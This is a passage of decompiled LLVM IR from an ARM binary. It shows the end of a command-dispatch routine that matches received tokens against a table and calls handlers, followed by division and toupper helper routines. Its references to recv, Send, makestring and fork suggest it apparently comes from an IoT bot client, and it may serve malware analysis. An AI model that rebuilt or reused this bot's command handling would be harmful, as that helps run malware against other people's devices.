  %v1_a838 = add i32 %v2_a808.pre-phi, 1
  store i32 %v1_a838, i32* @r1, align 4
  %v3_a844 = call i32 @strcpy(i32 %storemerge32.in, i32 %v1_a838)
  %v8_a8d4116 = load i32, i32* bitcast ([4 x i8]** @global_var_2344c.405 to i32*), align 4
  %v2_a8d8118 = icmp eq i32 %v8_a8d4116, 0
  br i1 %v2_a8d8118, label %dec_label_pc_a8e0, label %dec_label_pc_a854

dec_label_pc_a854:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a854
  %v7_a8d4121 = phi i32* [ %v7_a8d4, %dec_label_pc_a854 ], [ bitcast ([4 x i8]** @global_var_2344c.405 to i32*), %dec_label_pc_a7fc ]
  %storemerge21119 = phi i32 [ %v1_a8c4, %dec_label_pc_a854 ], [ 0, %dec_label_pc_a7fc ]
  %v7_a85c = load i32, i32* %v7_a8d4121, align 4
  %v2_a870 = inttoptr i32 %v7_a85c to i8*
  %v3_a870 = call i32 @strcasecmp(i8* %v2_a870, i32 %v2_a818)
  %v3_a88c = mul i32 %storemerge21119, 8
  %v2_a894 = add i32 %v3_a88c, add (i32 ptrtoint ([4 x i8]** @global_var_2344c.405 to i32), i32 4)
  %v1_a898 = inttoptr i32 %v2_a894 to i32*
  %v2_a898 = load i32, i32* %v1_a898, align 4
  store i32 43200, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_a898)
  %v1_a8c4 = add i32 %storemerge21119, 1
  %v5_a8d4 = mul i32 %v1_a8c4, 8
  %v6_a8d4 = add i32 %v5_a8d4, ptrtoint ([4 x i8]** @global_var_2344c.405 to i32)
  %v7_a8d4 = inttoptr i32 %v6_a8d4 to i32*
  %v8_a8d4 = load i32, i32* %v7_a8d4, align 4
  %v2_a8d8 = icmp eq i32 %v8_a8d4, 0
  br i1 %v2_a8d8, label %dec_label_pc_a8e0, label %dec_label_pc_a854

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a854, %dec_label_pc_a7fc
  %v4_a8f0 = call i32 @strcasecmp(i8* %v3_a8f0, i32 ptrtoint ([6 x i8]* @global_var_19c34.407 to i32))
  %v2_a8f8 = icmp eq i32 %v4_a8f0, 0
  br i1 %v2_a8f8, label %dec_label_pc_a33c, label %dec_label_pc_a900

dec_label_pc_a900:                                ; preds = %dec_label_pc_a8e0
  %v6_a908 = call i32 @strtok(i32 0, i32 ptrtoint (i32* @global_var_19c2c.400 to i32), i32 ptrtoint ([4 x i8]** @global_var_2344c.405 to i32), i32 %v4_a8f0, i32 ptrtoint (i32* @0 to i32))
  %v2_a918 = icmp eq i32 %v6_a908, 0
  br i1 %v2_a918, label %dec_label_pc_a398, label %dec_label_pc_a920

dec_label_pc_a920:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a900
  %storemerge32.in = phi i32 [ %v6_a908, %dec_label_pc_a900 ], [ %v6_a6cc, %dec_label_pc_a69c ]
  %storemerge32 = inttoptr i32 %storemerge32.in to i8*
  %v2_a924 = load i8, i8* %storemerge32, align 1
  %v2_a928 = icmp eq i8 %v2_a924, 0
  br i1 %v2_a928, label %dec_label_pc_a398, label %dec_label_pc_a6dc

; uselistorder directives
  uselistorder i8* %storemerge32, { 4, 2, 3, 1, 0 }
  uselistorder i32 %storemerge32.in, { 9, 3, 2, 5, 4, 1, 0, 8, 7, 6 }
  uselistorder i32* %v7_a8d4, { 1, 0 }
  uselistorder i32 %v1_a8c4, { 1, 0 }
  uselistorder i32 %storemerge21119, { 1, 0 }
  uselistorder i32 %.pre34, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge23, { 1, 0, 3, 2 }
  uselistorder i32 %v4_a684, { 1, 0, 2 }
  uselistorder i32 %v2_a624, { 3, 2, 1, 0 }
  uselistorder i32 %v1_a5c8, { 1, 0 }
  uselistorder i32 %v3_a594, { 1, 0 }
  uselistorder i32 %storemerge18102, { 1, 0 }
  uselistorder i32 %v0_a578, { 1, 0 }
  uselistorder i32 %v2_a544, { 1, 0 }
  uselistorder i32 %v2_a534, { 1, 0 }
  uselistorder i32 %v1_a4cc, { 0, 2, 1 }
  uselistorder i32 %v2_a54491, { 1, 0 }
  uselistorder i32 %v3_a54090, { 1, 0 }
  uselistorder i32 %.pre133, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge16115, { 1, 0 }
  uselistorder i32 %v2_a3e0, { 1, 0 }
  uselistorder i32 %stack_var_-44.026, { 1, 0 }
  uselistorder i32 %v2_a670, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a398, { 1, 0 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i32 %v4_a138, { 1, 0, 2 }
  uselistorder i32 %v2_a0a4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_9f78, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-664, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1688, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_2344c.405 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_2344c.405, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @strtok, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 1, 0 }
  uselistorder i32* @global_var_23e80.297, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 11, 9, 10 }
  uselistorder i32* @global_var_234bc.295, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_23e68.355, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* @global_var_23e70.364, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_23e60.390, { 1, 0 }
  uselistorder i32* @global_var_23e5c.306, { 1, 0 }
  uselistorder i32* @global_var_23e64.326, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint ([17 x i8]* @global_var_19b74.353 to i32), { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ()* @getpid, { 1, 0 }
  uselistorder i32 (i32*)* @time, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32 ()* @fork, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @strcasecmp, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder [2 x i8]* @global_var_19bcc.371, { 1, 0 }
  uselistorder i32 (i32, i8*)* @fopen, { 0, 2, 3, 1 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19a94.302, i32 0, i32 0), { 2, 1, 0 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a920, { 1, 0 }
  uselistorder label %dec_label_pc_a854, { 1, 0 }
  uselistorder label %dec_label_pc_a7c8, { 1, 0 }
  uselistorder label %dec_label_pc_a7b0, { 1, 0 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %dec_label_pc_a600, { 1, 0 }
  uselistorder label %dec_label_pc_a5e4, { 1, 0 }
  uselistorder label %dec_label_pc_a590, { 1, 0 }
  uselistorder label %dec_label_pc_a4d8, { 1, 0 }
  uselistorder label %dec_label_pc_a3ac, { 1, 0 }
  uselistorder label %dec_label_pc_a398, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a33c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a258, { 1, 0 }
  uselistorder label %dec_label_pc_a198, { 1, 0 }
  uselistorder label %dec_label_pc_a180, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_9fec, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_a99c = load i32, i32* @r1, align 4
  %v1_a99c = icmp slt i32 %v0_a99c, 0
  %v2_a99c = icmp eq i32 %v0_a99c, 0
  %v2_a9a0 = xor i32 %v0_a99c, %arg1
  br i1 %v2_a99c, label %dec_label_pc_aab4, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %entry
  br i1 %v1_a99c, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_a9a8
  %v2_a9a8 = sub i32 0, %v0_a99c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_a9a8, %bb
  %v1_aa74 = phi i32 [ %v2_a9a8, %bb ], [ %v0_a99c, %dec_label_pc_a9a8 ]
  %v1_a9ac = add i32 %v1_aa74, -1
  %v7_a9ac = icmp eq i32 %v1_aa74, 1
  br i1 %v7_a9ac, label %dec_label_pc_aa54, label %dec_label_pc_a9b4

dec_label_pc_a9b4:                                ; preds = %thread-pre-split
  %v1_a9b4 = icmp slt i32 %arg1, 0
  br i1 %v1_a9b4, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_a9b4
  %v2_a9b8 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_a9b4, %bb85
  %v0_aaa8 = phi i32 [ %arg1, %dec_label_pc_a9b4 ], [ %v2_a9b8, %bb85 ]
  %v3_a9bc = icmp uge i32 %v0_aaa8, %v1_aa74
  %v9_a9bc = icmp eq i32 %v0_aaa8, %v1_aa74
  %v2_a9c0 = xor i1 %v3_a9bc, true
  %v3_a9c0 = or i1 %v9_a9bc, %v2_a9c0
  br i1 %v3_a9c0, label %dec_label_pc_aa60, label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %bb86
  %v2_a9c4 = and i32 %v1_a9ac, %v1_aa74
  %v4_a9c4 = icmp eq i32 %v2_a9c4, 0
  br i1 %v4_a9c4, label %dec_label_pc_aa70, label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_a9c4
  %v3_a9cc = icmp ult i32 %v1_aa74, 536870912
  br i1 %v3_a9cc, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_a9cc
  %v4_a9d0 = mul i32 %v1_aa74, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_a9cc, %.thread
  %v0_a9f0.pr40.ph = phi i32 [ %v4_a9d0, %.thread ], [ %v1_aa74, %dec_label_pc_a9cc ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_a9cc ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_a9f0.pr40 = phi i32 [ %v4_a9e4, %bb89 ], [ %v0_a9f0.pr40.ph, %.preheader.preheader ]
  %v1_a9e8 = phi i32 [ %v4_a9e8, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_a9dc = icmp ugt i32 %v0_a9f0.pr40, 268435455
  br i1 %v2_a9dc, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_a9f0thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_a9e0 = icmp ult i32 %v0_a9f0.pr40, %v0_aaa8
  br i1 %v4_a9e0, label %bb88, label %dec_label_pc_a9f0thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_a9e4 = and i32 %v0_a9f0.pr40, 268435456
  %v3_a9e4 = icmp eq i32 %v2_a9e4, 0
  %v4_a9e4 = mul i32 %v0_a9f0.pr40, 16
  br i1 %v3_a9e4, label %bb89, label %dec_label_pc_a9f0.loopexit

bb89:                                             ; preds = %bb88
  %v2_a9e8 = and i32 %v1_a9e8, 268435456
  %v3_a9e8 = icmp eq i32 %v2_a9e8, 0
  %v4_a9e8 = mul i32 %v1_a9e8, 16
  br i1 %v3_a9e8, label %.preheader, label %dec_label_pc_a9f0thread-pre-split.loopexit.loopexit

dec_label_pc_a9f0thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_a9fc52.ph = phi i32 [ %v1_a9e8, %bb87 ], [ %v4_a9e8, %bb89 ]
  %v0_a9f0.pr42.ph = phi i32 [ %v0_a9f0.pr40, %bb87 ], [ %v4_a9e4, %bb89 ]
  br label %dec_label_pc_a9f0thread-pre-split.loopexit

dec_label_pc_a9f0thread-pre-split.loopexit:       ; preds = %dec_label_pc_a9f0thread-pre-split.loopexit.loopexit, %.thread3
  %v1_a9fc52 = phi i32 [ %v1_a9e8, %.thread3 ], [ %v1_a9fc52.ph, %dec_label_pc_a9f0thread-pre-split.loopexit.loopexit ]
  %v0_a9f0.pr42 = phi i32 [ %v0_a9f0.pr40, %.thread3 ], [ %v0_a9f0.pr42.ph, %dec_label_pc_a9f0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a9f0thread-pre-split

dec_label_pc_a9f0thread-pre-split:                ; preds = %dec_label_pc_a9f0thread-pre-split.loopexit, %bb91
  %v1_a9fc50 = phi i32 [ %v1_a9fc52, %dec_label_pc_a9f0thread-pre-split.loopexit ], [ %v3_a9fc, %bb91 ]
  %v2_a9f448 = phi i32 [ %v0_aaa8, %dec_label_pc_a9f0thread-pre-split.loopexit ], [ %v2_a9f4, %bb91 ]
  %v0_a9f0.pr = phi i32 [ %v0_a9f0.pr42, %dec_label_pc_a9f0thread-pre-split.loopexit ], [ %v3_a9f8, %bb91 ]
  br label %dec_label_pc_a9f0

dec_label_pc_a9f0.loopexit:                       ; preds = %bb88
  br label %dec_label_pc_a9f0

dec_label_pc_a9f0:                                ; preds = %dec_label_pc_a9f0.loopexit, %dec_label_pc_a9f0thread-pre-split
  %v1_a9fc = phi i32 [ %v1_a9fc50, %dec_label_pc_a9f0thread-pre-split ], [ %v1_a9e8, %dec_label_pc_a9f0.loopexit ]
  %v2_a9f4 = phi i32 [ %v2_a9f448, %dec_label_pc_a9f0thread-pre-split ], [ %v0_aaa8, %dec_label_pc_a9f0.loopexit ]
  %v1_a9f8 = phi i32 [ %v0_a9f0.pr, %dec_label_pc_a9f0thread-pre-split ], [ %v4_a9e4, %dec_label_pc_a9f0.loopexit ]
  %v2_a9f0 = icmp slt i32 %v1_a9f8, 0
  br i1 %v2_a9f0, label %dec_label_pc_aa04, label %bb90

bb90:                                             ; preds = %dec_label_pc_a9f0
  %v4_a9f4 = icmp ult i32 %v1_a9f8, %v2_a9f4
  br i1 %v4_a9f4, label %bb91, label %dec_label_pc_aa04

bb91:                                             ; preds = %bb90
  %v3_a9f8 = mul i32 %v1_a9f8, 2
  %v2_a9fc = icmp slt i32 %v1_a9fc, 0
  %v3_a9fc = mul i32 %v1_a9fc, 2
  br i1 %v2_a9fc, label %dec_label_pc_aa04, label %dec_label_pc_a9f0thread-pre-split

dec_label_pc_aa04:                                ; preds = %bb90, %dec_label_pc_a9f0, %bb91
  %v2_aa1063 = phi i32 [ %v3_a9fc, %bb91 ], [ %v1_a9fc, %bb90 ], [ %v1_a9fc, %dec_label_pc_a9f0 ]
  %v1_aa0855 = phi i32 [ %v3_a9f8, %bb91 ], [ %v1_a9f8, %bb90 ], [ %v1_a9f8, %dec_label_pc_a9f0 ]
  br label %dec_label_pc_aa08

dec_label_pc_aa08:                                ; preds = %.thread13, %dec_label_pc_aa04
  %v1_aa3c = phi i32 [ %v4_aa3c, %.thread13 ], [ %v2_aa1063, %dec_label_pc_aa04 ]
  %v1_aa10 = phi i32 [ %v1_aa4c, %.thread13 ], [ 0, %dec_label_pc_aa04 ]
  %v1_aa40 = phi i32 [ %v4_aa40, %.thread13 ], [ %v1_aa0855, %dec_label_pc_aa04 ]
  %v1_aa0c = phi i32 [ %v0_aa38, %.thread13 ], [ %v0_aaa8, %dec_label_pc_aa04 ]
  %v3_aa08 = icmp ult i32 %v1_aa0c, %v1_aa40
  br i1 %v3_aa08, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_aa08
  %v3_aa0c = sub i32 %v1_aa0c, %v1_aa40
  %v3_aa10 = or i32 %v1_aa10, %v1_aa3c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_aa08, %bb92
  %v1_aa18 = phi i32 [ %v1_aa0c, %dec_label_pc_aa08 ], [ %v3_aa0c, %bb92 ]
  %v1_aa1c = phi i32 [ %v1_aa10, %dec_label_pc_aa08 ], [ %v3_aa10, %bb92 ]
  %v4_aa14 = udiv i32 %v1_aa40, 2
  %v6_aa14 = icmp ult i32 %v1_aa18, %v4_aa14
  br i1 %v6_aa14, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_aa18 = urem i32 %v1_aa40, 2
  %v4_aa18 = icmp eq i32 %v3_aa18, 0
  %v6_aa18 = sub i32 %v1_aa18, %v4_aa14
  br i1 %v4_aa18, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_aa1c = udiv i32 %v1_aa3c, 2
  %v6_aa1c = or i32 %v1_aa1c, %v5_aa1c
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_aa24 = phi i32 [ %v6_aa18, %bb93 ], [ %v1_aa18, %.thread8 ], [ %v6_aa18, %bb94 ]
  %v1_aa28 = phi i32 [ %v1_aa1c, %bb93 ], [ %v1_aa1c, %.thread8 ], [ %v6_aa1c, %bb94 ]
  %v4_aa20 = udiv i32 %v1_aa40, 4
  %v6_aa20 = icmp ult i32 %v1_aa24, %v4_aa20
  br i1 %v6_aa20, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_aa24 = and i32 %v1_aa40, 2
  %v4_aa24 = icmp eq i32 %v3_aa24, 0
  %v6_aa24 = sub i32 %v1_aa24, %v4_aa20
  br i1 %v4_aa24, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_aa28 = udiv i32 %v1_aa3c, 4
  %v6_aa28 = or i32 %v1_aa28, %v5_aa28
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_aa30 = phi i32 [ %v6_aa24, %bb95 ], [ %v1_aa24, %.thread9 ], [ %v6_aa24, %bb96 ]
  %v1_aa34 = phi i32 [ %v1_aa28, %bb95 ], [ %v1_aa28, %.thread9 ], [ %v6_aa28, %bb96 ]
  %v4_aa2c = udiv i32 %v1_aa40, 8
  %v6_aa2c = icmp ult i32 %v1_aa30, %v4_aa2c
  br i1 %v6_aa2c, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_aa30 = and i32 %v1_aa40, 4
  %v4_aa30 = icmp eq i32 %v3_aa30, 0
  %v6_aa30 = sub i32 %v1_aa30, %v4_aa2c
  br i1 %v4_aa30, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_aa34 = udiv i32 %v1_aa3c, 8
  %v6_aa34 = or i32 %v1_aa34, %v5_aa34
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_aa4c = phi i32 [ %v1_aa34, %bb97 ], [ %v1_aa34, %.thread10 ], [ %v6_aa34, %bb98 ]
  %v0_aa38 = phi i32 [ %v6_aa30, %bb97 ], [ %v1_aa30, %.thread10 ], [ %v6_aa30, %bb98 ]
  %v2_aa38 = icmp eq i32 %v0_aa38, 0
  br i1 %v2_aa38, label %dec_label_pc_aa48, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_aa3c, 16
  br i1 %tmp, label %dec_label_pc_aa48, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_aa3c = udiv i32 %v1_aa3c, 16
  %v4_aa40 = udiv i32 %v1_aa40, 16
  br label %dec_label_pc_aa08

dec_label_pc_aa48:                                ; preds = %thread-pre-split12, %bb99
  %v1_aa48 = icmp slt i32 %v2_a9a0, 0
  br i1 %v1_aa48, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_aa48
  %v2_aa4c = sub i32 0, %v1_aa4c
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_aa54, %dec_label_pc_aa48, %bb100
  %v1_aa50 = phi i32 [ %v1_aa4c, %dec_label_pc_aa48 ], [ %v2_aa4c, %bb100 ], [ %arg1, %dec_label_pc_aa54 ], [ %v2_aa58, %bb101 ], [ %v1_aa6c80, %bb103 ], [ %v2_aa68, %bb104 ]
  ret i32 %v1_aa50

dec_label_pc_aa54:                                ; preds = %thread-pre-split
  br i1 %v1_a99c, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_aa54
  %v2_aa58 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_aa60:                                ; preds = %bb86
  br i1 %v3_a9bc, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_aa60
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_aa60, %bb102
  %v1_aa6c80 = phi i32 [ %arg1, %dec_label_pc_aa60 ], [ 0, %bb102 ]
  br i1 %v9_a9bc, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_aa64 = ashr i32 %v2_a9a0, 31
  %v2_aa68 = or i32 %v4_aa64, 1
  br label %.thread16

dec_label_pc_aa70:                                ; preds = %dec_label_pc_a9c4
  %v2_aa70 = icmp ugt i32 %v1_aa74, 65535
  br i1 %v2_aa70, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_aa70
  %v2_aa74 = and i32 %v1_aa74, 32768
  %v3_aa74 = icmp eq i32 %v2_aa74, 0
  %v4_aa74 = udiv i32 %v1_aa74, 65536
  br i1 %v3_aa74, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_aa70
  %v0_aa8070 = phi i32 [ %v1_aa74, %dec_label_pc_aa70 ], [ %v4_aa74, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_aa84 = phi i32 [ %v0_aa8070, %.thread19 ], [ %v4_aa74, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_aa80 = icmp ugt i32 %v1_aa84, 255
  br i1 %v2_aa80, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_aa84 = and i32 %v1_aa84, 128
  %v3_aa84 = icmp eq i32 %v2_aa84, 0
  %v4_aa84 = udiv i32 %v1_aa84, 256
  br i1 %v3_aa84, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_aa88 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_aa94 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_aa88, %bb108 ]
  %v1_aa90 = phi i32 [ %v1_aa84, %bb106 ], [ %v4_aa84, %bb107 ], [ %v4_aa84, %bb108 ]
  %v2_aa8c = icmp ugt i32 %v1_aa90, 15
  br i1 %v2_aa8c, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_aa90 = and i32 %v1_aa90, 8
  %v3_aa90 = icmp eq i32 %v2_aa90, 0
  %v4_aa90 = udiv i32 %v1_aa90, 16
  br i1 %v3_aa90, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_aa94 = add nsw i32 %v1_aa94, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_aa9c = phi i32 [ %v1_aa94, %.thread20 ], [ %v1_aa94, %bb109 ], [ %v2_aa94, %bb110 ]
  %v5_aaa0 = phi i32 [ %v1_aa90, %.thread20 ], [ %v4_aa90, %bb109 ], [ %v4_aa90, %bb110 ]
  %v2_aa98 = icmp ugt i32 %v5_aaa0, 3
  %v7_aa98 = icmp eq i32 %v5_aaa0, 4
  %v2_aa9c = xor i1 %v7_aa98, true
  %v3_aa9c = and i1 %v2_aa98, %v2_aa9c
  br i1 %v3_aa9c, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_aa9c = add nsw i32 %v4_aa9c, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_aaa0 = phi i32 [ %v4_aa9c, %.thread21 ], [ %v5_aa9c, %bb111 ]
  %v2_aaa0 = xor i1 %v2_aa98, true
  %v3_aaa0 = or i1 %v7_aa98, %v2_aaa0
  br i1 %v3_aaa0, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_aaa0 = udiv i32 %v5_aaa0, 2
  %v9_aaa0 = add i32 %v4_aaa0, %v8_aaa0
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_aaa8 = phi i32 [ %v4_aaa0, %bb112 ], [ %v9_aaa0, %bb113 ]
  %v1_aaa4 = icmp slt i32 %v2_a9a0, 0
  %v6_aaa8 = lshr i32 %v0_aaa8, %v1_aaa8
  %v2_aaac = sub i32 0, %v6_aaa8
  %v2_aaac.v6_aaa8 = select i1 %v1_aaa4, i32 %v2_aaac, i32 %v6_aaa8
  ret i32 %v2_aaac.v6_aaa8

dec_label_pc_aab4:                                ; preds = %entry
  %v0_aab8 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_aaa0, { 1, 0 }
  uselistorder i1 %v7_aa98, { 1, 0 }
  uselistorder i32 %v4_aa90, { 1, 0 }
  uselistorder i32 %v1_aa90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_aa84, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_aa84, { 1, 0, 2, 3 }
  uselistorder i32 %v4_aa74, { 1, 0 }
  uselistorder i32 %v0_aa38, { 1, 0 }
  uselistorder i32 %v4_aa2c, { 1, 0 }
  uselistorder i32 %v1_aa34, { 1, 2, 0 }
  uselistorder i32 %v4_aa20, { 1, 0 }
  uselistorder i32 %v1_aa28, { 1, 2, 0 }
  uselistorder i32 %v4_aa14, { 1, 0 }
  uselistorder i32 %v1_aa1c, { 1, 2, 0 }
  uselistorder i32 %v1_aa40, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_aa10, { 1, 0 }
  uselistorder i32 %v1_aa3c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_a9fc, { 1, 0 }
  uselistorder i32 %v3_a9f8, { 1, 0 }
  uselistorder i32 %v1_a9f8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_a9f4, { 1, 0 }
  uselistorder i32 %v1_a9fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_a9e8, { 1, 0 }
  uselistorder i32 %v4_a9e4, { 2, 1, 0 }
  uselistorder i32 %v1_a9e8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_a9f0.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_a9bc, { 1, 0 }
  uselistorder i32 %v1_aa74, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_a9a0, { 1, 0, 2 }
  uselistorder i32 %v0_a99c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_aa48, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_aa04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9f0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_aacc = sdiv i32 %arg1, %arg2
  ret i32 %v2_aacc
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_aae8 = call i32 @raise(i32 8)
  ret i32 %v1_aae8
}

define i32 @toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_aaf4 = add i32 %arg1, -97
  %tmp = icmp ult i32 %v1_aaf4, 26
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v5_aafc = and i32 %arg1, 95
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_ab00 = phi i32 [ %arg1, %entry ], [ %v5_aafc, %bb ]
  ret i32 %v1_ab00

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__toupper_l(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ab04 = add i32 %arg1, -97
  %tmp = icmp ult i32 %v1_ab04, 26
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v5_ab0c = and i32 %arg1, 95
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_ab10 = phi i32 [ %arg1, %entry ], [ %v5_ab0c, %bb ]
  ret i32 %v1_ab10

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @dummy() local_unnamed_addr {
entry:
  %v1_ab14 = load i32, i32* @r0, align 4
  ret i32 %v1_ab14
}

define i32 @dummy1(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ab18 = load i32, i32* @r0, align 4
  ret i32 %v1_ab18
}

